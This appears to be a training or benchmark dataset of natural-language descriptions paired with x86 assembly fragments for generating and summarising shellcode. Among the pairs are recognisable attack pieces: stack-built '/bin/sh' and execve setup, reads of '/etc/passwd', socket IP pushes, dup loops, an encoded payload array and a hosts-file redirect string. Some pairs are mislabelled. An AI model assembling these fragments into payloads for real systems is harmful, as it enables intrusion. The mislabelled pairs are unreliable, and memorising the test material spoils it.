input_text,target_text
"ShellCodeSum: test dl, 0x1 \n jnz ready_to_proxy",jump to the label ready_to_proxy if the contents of the dl register is not zero
ShellCodeGen: push the value 0x64687373 onto the stack and point the esi register to the stack register,"push 0x64687373 \n mov esi, esp"
"ShellCodeSum: shr eax, 2",divide eax by 4 using right shift
ShellCodeGen: jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register,"cmp edx, ebx \n je 0x8 \n mov ebx, edx"
ShellCodeGen: load the effective address [zero_reg+3] into ebx,"lea ebx, [zero_reg+3]"
ShellCodeSum: push word 0x1b6,push the word 0x1b6 to the stack
"ShellCodeSum: add dx, 0x2f2f",add 0x2f2f to the contents in dx and save the result in dx
ShellCodeGen: negate all the bits of the ecx register,not ecx
ShellCodeGen: push 0x10 to the stack,push 0x10
"ShellCodeSum: sub bx, bx",subtract the contents of bx from the contents of bx
ShellCodeSum: pushl $0x6e69622f,push $0x6e69622f onto the stack
ShellCodeGen: if the contents of the eax register is equal to the contents of the ebx register then jump to the all label else zero out the eax register,"cmp eax, ebx \n je all \n xor eax, eax"
ShellCodeGen: decrease ecx by 1,"sub ecx, 1"
ShellCodeGen: define here label,here:
"ShellCodeSum: cmp eax, ebx \n je exit \n add al, 0x3",jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x3 into the al register
ShellCodeSum: call _malloc,call _malloc
"ShellCodeSum: mov eax, 19",make the system call to go to the file offset
ShellCodeGen: subtract 5e5d7722 from the contents of the eax register,"sub eax, 5e5d7722"
ShellCodeGen: define the _setsockopt label,_setsockopt:
"ShellCodeSum: and eax, 0fh",clear all but the last 4 bits of eax
ShellCodeGen: section for initialized data,section .data
ShellCodeSum: jmp short three,jump short to the three label
ShellCodeGen: jump to the label l2 if the unsigned contents of the al register is lower than the unsigned contents of the bl register,"cmp al, bl \n jb l2"
ShellCodeGen: jump to 80480aa if not equal,jne 80480aa
ShellCodeGen: restore esi from the stack,pop esi
ShellCodeSum: push word 0x0a,push the word 0x0a onto the stack
"ShellCodeSum: mov [esi+47], eax",move eax into the address [esi+47]
ShellCodeGen: compare the contents of bl and 0x1f,"cmp bl, 0x1f"
ShellCodeGen: define the call_decoded label,call_decoded:
"ShellCodeSum: add eax, 24",add 24 to eax
ShellCodeGen: push 0x30313a31 onto the stack,push 0x30313a31
ShellCodeGen: decrement the contents of cl,dec cl
ShellCodeGen: jump to loc_402B13 if the contents of the edx register is equal to 42,"cmp edx, 42 \n je short loc_402B13"
ShellCodeSum: section .data,declare section containing initialized data
ShellCodeSum: re,define label re
ShellCodeSum: cmd: db 'cat /etc/passwd',define cmd as the byte string 'cat /etc/passwd'
ShellCodeSum: push word 0x692d,push the word 0x692d onto the stack
ShellCodeSum: push ebp,push the ebp onto the stack
"ShellCodeSum: sar eax, 23",right shift the contents of eax by 23 bits
ShellCodeGen: jump to the label close if the contents of the eax register is zero,"test eax, eax \n jz close"
ShellCodeSum: push 0x742f2f2f,push 0x742f2f2f onto the stack
ShellCodeGen: move 5 into eax,"mov eax, 0x5"
ShellCodeSum: _cmd:,define the _cmd label
ShellCodeSum: loopnz next,decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero
ShellCodeSum: push ebx,push ebx to the stack
ShellCodeSum: je continue,jump to label continue if equal
"ShellCodeSum: cmp ecx, 5",compare ecx with 5
ShellCodeSum: push dword 0x656e7265,push the dword 0x656e7265 onto the stack
ShellCodeSum: push 0x682f2f2f,push the 0x682f2f2f value onto the stack
ShellCodeGen: move 0x343997b7 into edi,"mov edi, 0x343997b7"
ShellCodeSum: formatting:,define formatting label
ShellCodeGen: push the dword 0x69622f3a onto the stack,push dword 0x69622f3a
"ShellCodeSum: mov dx, 0x2a1",move the value 0x2a1 into the dx register
ShellCodeGen: push double word 0x39396e2d onto the stack and point the ebx register to the stack register,"push dword 0x39396e2d \n mov ebx, esp"
ShellCodeSum: push 0x6168732f,push 0x6168732f to the stack
"ShellCodeSum: push word 0x662d \n mov eax, esp",push the word 0x662d onto the stack and point the eax register to the stack register
ShellCodeSum: arr dd 100,define the doubleword arr and initialize it to 100
ShellCodeSum: push 0x0,push the value 0x0 to the stack
"ShellCodeSum: cmp cl, 12 \n jg l2",if the contents of the cl register is greater than the decimal value 12 then jump to the label l2
ShellCodeGen: jump short to the three label,jmp short three
ShellCodeGen: push ecx onto the stack,push ecx
"ShellCodeSum: mov byte al, 11",move 11 into the byte at address al
"ShellCodeSum: mov al, 0x3f",syscall 63
ShellCodeGen: move 04h into al,"mov al, 04h"
ShellCodeGen: make the system call exit,"mov eax, 1"
ShellCodeGen: jump to 0x41 if not zero,jnz 0x41
ShellCodeSum: push 0x2e323931,push 0x2e323931 onto the stack
ShellCodeSum: callme:,define the callme label
"ShellCodeSum: cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40",jump to the memory address 0xf3 if the unsigned contents of the bl register is lower than the unsigned value 0x1f else add the 0x40 value to the al register
ShellCodeGen: perform a logical xor between the ebx register and the ebp register and save the result in ebx,"xor ebx, ebp"
"ShellCodeSum: mov dword [esp-12], 0x6374652f",move 0x6374652f into the dword at the memory location [esp-12]
ShellCodeSum: push 0x1,push 0x1 onto the stack
ShellCodeSum: not word ax,negate all the bits of the word at the address ax
ShellCodeGen: jump to the wrap_around label if the destination operand is less than the source operand in the above comparison,jl wrap_around
ShellCodeGen: compare if the contents of al with 0xf2,"cmp al, 0xf2"
ShellCodeGen: move 0x1a4 into dx,"mov dx, 0x1a4"
ShellCodeGen: subtract 0x44444444 from edi and save the result in edi,"sub edi, 0x44444444"
"ShellCodeSum: mov eax, [ebx+esi]",move the contents of memory address ebx+esi into eax
ShellCodeSum: push word 0x4255,push the word 0x4255 onto the stack
ShellCodeGen: reserve filecontents variable of 128 bytes,filecontents: resb 128
"ShellCodeSum: test eax, eax \n jnz exit_on_error",if the contents of the eax register is not zero then jump to the label exit_on_error
ShellCodeGen: declare the execfile label,execfile:
"ShellCodeSum: mov eax, 20",system call getpid
ShellCodeGen: jump to the label l3 if the contents of the dl register is greater than the decimal value 27,"cmp dl, 27 \n jg l3"
"ShellCodeSum: mov ebx, [my_table]",save the effective address of my_table in ebx
"ShellCodeSum: cmp ebx, 9 \n ja exit \n jmp loop",if the unsigned contents of the ebx register is greater than the unsigned value 10 then jump to the exit label else jump to the loop label
ShellCodeGen: move 0x88998899 into ecx,"mov ecx, 0x88998899"
ShellCodeSum: pop eax,restore the top of the stack into the eax register
"ShellCodeSum: mov eax, 4",move 4 to the eax register
ShellCodeSum: push word 0544o,push the word 0544o onto the stack
ShellCodeGen: define google as the byte string '127.1.1.1 google.com',google db '127.1.1.1 google.com'
ShellCodeGen: call the _myfunc function,call _myfunc
ShellCodeGen: move the contents of bx into ax,"mov ax, bx"
ShellCodeGen: perform the xor operation between the al register and the value 0x4a,"xor al, 0x4a"
"ShellCodeSum: add eax, ebx",add ebx to eax and store the result in eax
"ShellCodeSum: add eax, 10",add 10 to the contents of eax
ShellCodeGen: move edi into the doubleword starting at the address esp-8,"mov dword [esp-8], edi"
ShellCodeSum: jmp encrypt,jump to the encrypt label
"ShellCodeSum: lea eax, [zero_reg+66h]",load the effective address [zero_reg+66h] into eax
ShellCodeGen: move the byte at the address 0x1 into al,"mov al, byte 0x1"
"ShellCodeSum: xor edx, edx \n push edx",push zero onto the stack
ShellCodeGen: declare code section,section .text
ShellCodeGen: declare the writestring label,writestring:
ShellCodeSum: push byte 28,push the byte 28 to the stack
ShellCodeGen: make the system call to send the signal to another process,"mov eax, 37"
"ShellCodeSum: mov [esi+43], ebx",move ebx into the address [esi+43]
"ShellCodeSum: mov [bp+0x07], al",move the contents of the al register at the memory location specified by the operation [bp+0x07]
ShellCodeGen: jump to the exit label if the zero flag is set,jz exit
"ShellCodeSum: mov bl, byte 0eh",move the byte 0eh into bl
"ShellCodeSum: mov eax, 20",make the system call to get the process ID
ShellCodeGen: move the value of ax into memory at address 1000h,"mov [1000h], ax"
ShellCodeGen: move 0x01 into al,"mov al, 0x01"
"ShellCodeSum: push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov eax, esp",push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the eax register to the stack register
ShellCodeGen: subtract the contents of the bl register from the contents of the cl register and jump to the l3 label if the result is not negative,"sub cl, bl \n jns l3"
ShellCodeGen: swap the values of ebx and eax registers,"xchg ebx, eax"
ShellCodeGen: perform a bitwise and of the contents of ax and the contents of ax,"test ax, ax"
"ShellCodeSum: xor eax, eax \n push eax",zero out the eax register and push zero onto the stack
ShellCodeGen: right shift the contents of the dl register by 1 bit,"shr dl, 1"
ShellCodeSum: loopnz Label1,decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero
"ShellCodeSum: push byte 0x7 \n mov edx, esp",push the byte 0x7 onto the stack and point edx to the stack register
ShellCodeSum: pop edx,pop the value on the stack back into edx
ShellCodeGen: move the contents of the al register into the edi register,"mov [edi], al"
ShellCodeGen: make sys_write kernel call,int 80h
ShellCodeGen: subtract 0x7 from bl and save the result into bl,"sub bl, 0x7"
ShellCodeGen: jump short to the _start label,jmp short _start
"ShellCodeSum: mov ecx, offset array",move starting address of array to ecx
ShellCodeGen: add 30 to the single byte stored at memory address var,"add byte [var], 30"
ShellCodeSum: push 0x81e3a8c0,push 0x81e3a8c0 onto the stack
ShellCodeSum: push 0xb,push 0xb onto the stack
ShellCodeGen: define word3 uninitialized unsigned word,word3 word ?
"ShellCodeSum: loop l3 \n mov ecx, esp",decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
"ShellCodeSum: mov ebp, esp",move esp into ebp
ShellCodeGen: push the 0x4c4c4128 onto the stack,push 0x4c4c4128
"ShellCodeSum: or dx, 0xfff",perform or operation between dx and 0xfff and save the result into dx
ShellCodeSum: push word 0x0f27,push the word 0x0f27 onto the stack
ShellCodeGen: move eax into ebx,"mov ebx, eax"
"ShellCodeSum: xor ax, 0x7777",perform the xor operation between the contents of the ax register and the value 0x7777
ShellCodeSum: push 0x6168732f,push 0x6168732f onto the stack
ShellCodeSum: push edi,push the edi onto the stack
ShellCodeGen: perform the xor operation between cl and 0x32 and store the resut in cl,"xor cl, 0x32"
ShellCodeGen: push the dword 0x214c4f4c onto the stack,push dword 0x214c4f4c
"ShellCodeSum: mov eax, 0x5",move 5 into eax
ShellCodeSum: push 0x3170762d,push the 0x3170762d onto the stack
"ShellCodeSum: push 0x7461632f \n push 0x6e69622f \n mov esi, esp",push the value 0x7461632f and the value 0x6e69622f onto the stack and point the esi register to the stack register
"ShellCodeSum: mov dx, 132",move 132 into dx
ShellCodeGen: call the _continue function,call _continue
"ShellCodeSum: lea edi, [esi + 13]",load the effective address of the result of the operation [esi + 13] into the edi register
ShellCodeGen: push the contents of the cx register onto the stack,push cx
"ShellCodeSum: mov edi, ecx",move ecx to edi
ShellCodeSum: loopnz L1 \n jmp shellcode,decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label
ShellCodeSum: loopinghere:,declare the loopinghere label
ShellCodeSum: jmp short formatting,jump short to the formatting label
ShellCodeSum: jmp short output,jump short to the output label
"ShellCodeSum: mov ecx, [esp]",move the contents of esp into ecx
"ShellCodeSum: cmp cl, 0x3 \n jne loop",if the contents of the cl register is not equal to the value 0x3 then jump to the loop label
"ShellCodeSum: mov ecx, eatmsg",move eatmsg into ecx
ShellCodeGen: decrement the counter and jump to the do_dup label if the count is not zero,loop do_dup
ShellCodeSum: jmp short 0x34,jump short to 0x34
ShellCodeGen: define the numeric label 2,2:
ShellCodeGen: move 0xa4 into the byte at address al,"mov byte al, 0xa4"
"ShellCodeSum: mov [ebx], 123",move 123 into the effective address saved in ebx
ShellCodeGen: define the child label,child:
ShellCodeGen: decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register,loopnz next2 \n jmp edi
"ShellCodeSum: mov al, 0x7",move 0x7 into al
ShellCodeGen: allocate one byte of memory for var_b variable and initialize it to 'c',var_b db 'c'
"ShellCodeSum: mov eax, 10000h",move 10000h into eax register
ShellCodeGen: define the label 2,2:
ShellCodeGen: negate the contents of var,neg var
ShellCodeGen: move the value 0x61722f6c into the double word starting at the address [esp-0x18],"mov dword [esp-0x18], 0x61722f6c"
ShellCodeGen: push the value 0x6374652f onto the stack and point ebp to the stack register,"push 0x6374652f \n mov ebp, esp"
"ShellCodeSum: sub bl, byte [esi]",subtract 0x7 from the byte in esi register
ShellCodeGen: if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster then jump to the next_address label else jump to the eax register,"cmp dword [eax], ebx \n jne next_addr \n jmp eax"
ShellCodeSum: push byte 1,push byte 1 onto the stack
ShellCodeGen: if not zero jump short to the _paren label,jnz short _paren
ShellCodeGen: call the _exec function,call _exec
ShellCodeSum: push 0x2e383631,push 0x2e383631 to the stack
ShellCodeGen: perform a logical xor between the eax register and the ebx register and save the result in eax,"xor eax, ebx"
ShellCodeSum: get:,declare the get label
ShellCodeGen: add the contents of the edx register to the contents of eax register,"add eax, edx"
ShellCodeGen: perform an unsigned comparison and jump to 0xf3 if lower,jb 0xf3
ShellCodeGen: extend the sign bit of eax into the edx register,cdq
ShellCodeSum: pop ecx,restore ecx from the value we pushed onto the stack at the start
"ShellCodeSum: rol edi, 1",left rotate the contents of the edi register by 1 bit
ShellCodeGen: push 0x50446862 onto the stack,push 0x50446862
ShellCodeSum: jmp begin,jump to the instruction labeled begin
ShellCodeGen: declare data section,section .data
ShellCodeSum: db 0xcd,define the byte 0xcd
ShellCodeGen: stat,"mov eax, 106"
ShellCodeGen: define the byte string google and initialize it to '127.1.1.1 google.com',google: db '127.1.1.1 google.com'
ShellCodeSum: push 0x2f6e6962,push 0x2f6e6962 to the stack
ShellCodeSum: push edi,push the contents of edi register onto the stack
ShellCodeGen: move command into ebx,"mov ebx, command"
"ShellCodeSum: push edi \n mov eax, esp",push the contents of the edi register onto the stack and point eax to the stack register
"ShellCodeSum: cmp eax, ebx \n je 0x47 \n xor ecx, ecx",if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register
ShellCodeGen: perform the xor operation between dl and 0xbb and store the result in dl,"xor dl, 0xbb"
"ShellCodeSum: cmp al, 0xf2 \n je _start \n mov eax, 0x50905090",if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register
ShellCodeSum: jz nomoreargs,if zero flag is set jump to nomoreargs label
ShellCodeGen: push 0x76766c2d to the stack,push 0x76766c2d
ShellCodeGen: move 13 into edx,"mov edx, 13"
ShellCodeSum: message db '/etc/passwd',define message as the byte string '/etc/passwd'
ShellCodeGen: define decode function,decode:
ShellCodeGen: jump short to the call_decoder label,jmp short call_decoder
ShellCodeGen: copy the contents of ebx into eax register,"mov eax, ebx"
ShellCodeGen: push 0x2e383631 to the stack,push 0x2e383631
ShellCodeGen: move the contents of x into ebx,"mov ebx, x"
ShellCodeGen: read,"mov eax, 3"
ShellCodeSum: neg var,negate the contents of var
ShellCodeSum: jocker:,declare the jocker label
ShellCodeGen: push 0x706d742f to the stack,push 0x706d742f
ShellCodeGen: perform a logical xor between the ecx register and the dh register and save the result in ecx,"xor ecx, dh"
ShellCodeGen: push the byte +0x3 onto the stack,push byte +0x3
ShellCodeSum: db '/bin/sh',define a byte string and initialize it to '/bin/sh'
ShellCodeGen: add 0x12345678 to the contents in eax and save the result in eax,"add eax, 0x12345678"
ShellCodeGen: call the doit function,call doit
ShellCodeGen: open the file,"mov eax, 5"
ShellCodeSum: jnz next_addr,jump to next_addr if not zero
ShellCodeGen: decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero,loop main_inc
"ShellCodeSum: cmp eax, ebp \n jnz short loc_40102B",if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B
ShellCodeSum: push byte CHMOD_CALL \n pop eax,put the byte CHMOD_CALL into the eax register
ShellCodeGen: load the effective address of the result of the operation [esp +1] into the ebx register,"lea ebx, [esp +1]"
ShellCodeGen: jump to label done if equal,je done
ShellCodeGen: declare the priv_setuid label,priv_setuid:
ShellCodeSum: loop do_dup,decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero
"ShellCodeSum: add eax, 48",add decimal 48 to eax
ShellCodeGen: define the _close label,_close:
ShellCodeGen: move 0x1c into dl,"mov dl, 0x1c"
ShellCodeGen: jump short to exi label,jmp short exi
ShellCodeSum: execfile:,declare the execfile label
ShellCodeGen: move al into the byte at address [esi+21],"mov byte [esi+21], al"
"ShellCodeSum: mov bl, byte [esi]",move the byte at the address [esi] into bl
ShellCodeSum: jmp short .exit,jump short to the .exit label
ShellCodeGen: push byte 0 onto stack,push byte 0
ShellCodeGen: if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D,"cmp bl, 78h \n jge short loc_402B1D"
ShellCodeGen: jump to fupdisasm+1,jmp fupdisasm+1
ShellCodeGen: push 0x6168732f to the stack,push 0x6168732f
ShellCodeGen: push the byte 0x1 onto the stack,push byte 0x1
ShellCodeGen: move 0xb into al,"mov al, 0xb"
ShellCodeGen: set carry flag,stc
ShellCodeGen: move ASCII /bin/sh into ebx,"push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp"
ShellCodeGen: define the _user label,_user:
ShellCodeGen: push the 4 bytes at address tmp onto stack,push [tmp]
ShellCodeSum: push word 0x776f,push the word 0x776f onto the stack
"ShellCodeSum: mov [esi+35], esi",move esi into the address [esi+35]
ShellCodeGen: decrement the eax register by one,dec eax
ShellCodeGen: move 123 into the effective address saved in ebx,"mov [ebx], 123"
ShellCodeGen: init edi 0,"xor edi, edi"
ShellCodeGen: subtract the contents of esi from the 32-bit integer stored at memory location var,"sub [var], esi"
ShellCodeGen: invoke sys_fork,"mov eax, 2"
ShellCodeGen: move 100 into cl,"mov cl, 100"
"ShellCodeSum: lea ebx, [zero_reg+3]",load the effective address of the result of the operation [zero_reg+3] into the ebx register
ShellCodeGen: push 0x782f2f32 to the stack,push 0x782f2f32
"ShellCodeSum: shl edx, 9",left shift the contents of edx register by 9 bit positions
ShellCodeSum: pop esi,pop the value on the stack back into esi
"ShellCodeSum: push 0x69622f2f \n mov edx, esp",push the value 0x69622f2f onto the stack and point the edx register to the stack register
ShellCodeGen: push the dword 0x6164732f onto the stack,push dword 0x6164732f
"ShellCodeSum: lea ebx, [edx+0x4]",load the effective address of edx+0x4 into ebx
ShellCodeSum: push 0xdebf,push 0xdebf value to the stack
ShellCodeSum: jne short _while_loop,jump to the _while_loop label if the operands of the above comparison are not equals
ShellCodeGen: jump short to the four label,jmp short four
ShellCodeGen: section data,section .data
ShellCodeGen: load the effective address of ebx+8 into ecx,"lea ecx, [ebx+8]"
ShellCodeGen: push the dword 0x0501a8c0 onto the stack,push dword 0x0501a8c0
ShellCodeGen: if not zero jump to loc_4010e5,jnz short loc_4010e5
"ShellCodeSum: mov eax, 0xfeffff80",move 0xfeffff80 into eax
ShellCodeGen: make the system call to suspend the process,"mov eax, 29"
"ShellCodeSum: xor eax, eax",zero out eax
ShellCodeSum: push byte 25 \n pop eax,put the syscall 25 into the eax register
ShellCodeGen: increment the contents of the esp register,inc esp
ShellCodeGen: perform the or operation between the eax register and 0xffffffff,"or eax, 0xffffffff"
"ShellCodeSum: mov ebx, buff",move buff to ebx
"ShellCodeSum: cmp BYTE al, 2 \n je do_inject \n jmp while",jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register else jump to the while label
ShellCodeGen: define fupdisasm function,fupdisasm:
ShellCodeSum: not ecx,negate all the bits of the ecx register
ShellCodeGen: move the contents at memory specified by temp into eax,"mov eax, [temp]"
ShellCodeGen: call _malloc,call _malloc
"ShellCodeSum: cmp eax, ebx \n jne retry",jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register
"ShellCodeSum: test eax, eax",perform a bitwise and on the contents of the eax register
ShellCodeGen: push 0x65782e2f onto the stack,push 0x65782e2f
ShellCodeSum: push ebx,push ebx on the stack
ShellCodeSum: push byte 16,push the byte 16 onto the stack
ShellCodeGen: push the word 0x3905 onto the stack,push word 0x3905
ShellCodeGen: init eax 0,"xor eax, eax"
ShellCodeSum: section .bss,declare the bss section
"ShellCodeSum: sub al, 88",subtract 88 from the contents of the al register
ShellCodeSum: jmp edi,jump to the edi label
ShellCodeSum: push 0x782f2f32,push 0x782f2f32 to the stack
ShellCodeGen: multiply edx by 2 using left shift,"shl edx, 1"
ShellCodeSum: push 0x10,push 0x10 to the stack
ShellCodeGen: call the esi function,call esi
ShellCodeGen: compare the contents of the ebp register with the value 0,"cmp ebp, 0"
"ShellCodeSum: xor dl, 0xbb",perform the xor operation between dl and 0xbb and store the result in dl
ShellCodeSum: addr: db 0x1,define the byte addr and initialize it to 0x1
"ShellCodeSum: mov ebx, x",move the contents of x into ebx
ShellCodeGen: define number variable of a word and initialize to 12345,number dw 12345
ShellCodeSum: mul edx,mul eax by edx
"ShellCodeSum: sub cx, 0x7ff",subtract 0x7ff from the contents of cx register value and save the result in cx
ShellCodeGen: move donemsg into ecx,"mov ecx, donemsg"
"ShellCodeSum: xor edx, edx",initialize edx with the hexadecimal value 0x0
ShellCodeGen: move _start into eax,"mov eax, _start"
"ShellCodeSum: xor cl, 0xaa",perform the xor operation between cl and 0xaa and store the result in cl
ShellCodeGen: move the contents of the al register at the memory location specified by the operation [bp+0x31]],"mov [bp+0x31], al"
"ShellCodeSum: sub esp, 0x28",subtract the value 0x28 from the esp register
"ShellCodeSum: cmp eax, ebx \n je exit \n add al, 0x3",if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x3 into the al register
ShellCodeSum: push_cmd:,declare push_cmd label
"ShellCodeSum: push dword 0x39396e2d \n mov ebp, esp",push double word 0x39396e2d onto the stack and point the ebp register to the stack register
ShellCodeGen: push double word 0x39396e2d onto the stack and point the ebp register to the stack register,"push dword 0x39396e2d \n mov ebp, esp"
"ShellCodeSum: mov esi, eax",move pointer in eax into esi
"ShellCodeSum: cmp edx, ebx \n je 0x8 \n",jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register
ShellCodeGen: push the byte 9 onto the stack,push byte 9
"ShellCodeSum: mov al, byte 2ah",move the byte 2ah into al
"ShellCodeSum: mov al, byte 66h",move the byte at the address 66h into al
ShellCodeGen: move value of memory address [ebp+8] into eax,"mov eax, [ebp+8]"
ShellCodeGen: make the system call waitpid,"mov eax, 7"
"ShellCodeSum: cmp bl, 78h \n jle short loc_402B1D",if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D
"ShellCodeSum: lea ecx, [ebx+8]",load the effective address of ebx+8 into ecx
"ShellCodeSum: lea ecx, [ebp+28]",load the effective address of the result of the operation [ebp+28] into the ecx register
ShellCodeSum: push esi,push esi on the stack
"ShellCodeSum: push 0x64687373 \n mov esi, esp",push the value 0x64687373 onto the stack and point the esi register to the stack register
ShellCodeGen: jump to label _accept,jmp _accept
ShellCodeGen: define the _isegg label,_isegg:
ShellCodeGen: load the effective address of esp into the ecx register,"lea ecx, [esp]"
ShellCodeGen: move value of 1 into register ax,"mov ax, 1"
"ShellCodeSum: mov eax, [z]",move the contents at memory specified by z to eax
"ShellCodeSum: sub ecx, ecx",subtract the contents of the ecx register from the contents of the ecx register
ShellCodeGen: add esi into memory address ebp-4,"add [ebp-4], esi"
ShellCodeGen: move 39 into al,"mov al, 39"
ShellCodeGen: subtract 88 from the contents of the al register,"sub al, 88"
"ShellCodeSum: push ebx \n mov edx, esp",push the contents of the ebx register onto the stack and point edx to the stack register
ShellCodeGen: move linefeed character into eax,"mov eax, 0ah"
ShellCodeGen: push 0x76766c2d onto the stack,push 0x76766c2d
"ShellCodeSum: sub bl, 0x7",subtract 0x7 from bl and save the result into bl
ShellCodeGen: move the contents of ecx into the memory location specified by the operation [ebp+12],"mov [ebp+12], ecx"
ShellCodeGen: if the contents of the eax register is zero then jump to the label ready_to_proxy,"test eax, eax \n jz ready_to_proxy"
ShellCodeSum: push word 0x8223,push the word 0x8223 onto the stack
"ShellCodeSum: sar ecx, 2",right shift the value of register ecx by 2 bits
ShellCodeGen: move 0x31263e32 into eax,"mov eax, 0x31263e32"
ShellCodeGen: specify sys_read call,"mov eax, 3"
"ShellCodeSum: mov edi, ecx",move ecx into edi
ShellCodeSum: pop ebx,restore the original value of ebx
ShellCodeSum: push 0x7372656f,push 0x7372656f to the stack
ShellCodeGen: push 0x6769666e onto the stack,push 0x6769666e
ShellCodeGen: mmap,"mov eax, 90"
"ShellCodeSum: xor eax, eax",reset eax
ShellCodeSum: jns duploop,jump to duploop if not negative
"ShellCodeSum: mov edx, 255",move decimal number 255 into edx
"ShellCodeSum: cmp dl, 27 \n jg l3",if the contents of the dl register is greater than the decimal value 27 then jump to the label l3
"ShellCodeSum: mov [esp+57], al",move al into the address [esp+57]
"ShellCodeSum: lea ecx, [esi+18]",load the effective address of the result of the operation [esi+18] into the ecx register
ShellCodeSum: popad,pop doublewords from the stack into the 32 bit registers
ShellCodeGen: zero out the eax register and the ebx register,"xor ebx, ebx \n mul ebx"
ShellCodeGen: push the value 0x6374652f onto the stack and point ebx to the stack register,"push 0x6374652f \n mov ebx, esp"
ShellCodeSum: global _start,declare _start as global label
ShellCodeGen: jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD,"cmp byte [esi], 0xD \n jle wrap_around"
ShellCodeGen: jump to the edi label,jmp edi
ShellCodeSum: createfile:,define createfile function
ShellCodeSum: jne 80480aa,jump to 80480aa if not equal
ShellCodeGen: push 0x73644d24 onto the stack,push 0x73644d24
ShellCodeSum: jz child,jump to label child if the zero flag is set
"ShellCodeSum: mov byte al, 0xa4",move 0xa4 into the byte at address al
ShellCodeGen: push the byte 0x30 onto the stack,push byte 0x30
ShellCodeSum: call_shellcode:,define call_shellcode label
ShellCodeGen: push the byte 70 onto the stack,push byte 70
ShellCodeGen: move the value 0x1234567 into the edx register,"mov edx, 0x1234567"
ShellCodeSum: push 20,push 20 onto the stack
ShellCodeGen: move ebx into the address [esi+43],"mov [esi+43], ebx"
"ShellCodeSum: push word 0x662d \n mov esi, esp",push the word 0x662d onto the stack and point the esi register to the stack register
ShellCodeSum: jl wrap_around,jump to the wrap_around label if the destination operand is less than the source operand in the above comparison
"ShellCodeSum: mov al, 66h",move 66h into al
"ShellCodeGen: define shellcode as an array of bytes and initialize it to 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23","shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23"
ShellCodeGen: move the contents at memory address y to ebx,"mov ebx, [y]"
ShellCodeGen: move the value 0xfee1dead into the ebx register,"mov ebx, 0xfee1dead"
ShellCodeSum: jmp nextarg,jump to nextarg label
"ShellCodeSum: sub ecx, 0x1525152a",subtract 0x1525152a from the contents in ecx and save the result in ecx
ShellCodeSum: two:,declare the two label
"ShellCodeSum: mov eax, 8",invoke sys_creat
ShellCodeGen: push the word 0x5974 onto the stack,push word 0x5974
ShellCodeGen: load the effective address of the result of the operation [esi+18] into the ecx register,"lea ecx, [esi+18]"
ShellCodeSum: an_integer dd 12425,define the doubleword an_integer and initialize it to 12425
ShellCodeSum: push 0x65782e2f,push 0x65782e2f to the stack
ShellCodeSum: div dword [var],divide the contents of in eax by by the word value stored at memory location var
ShellCodeGen: return to the address on the top of the stack,ret
ShellCodeSum: jb modtest,jump to label modtest if below
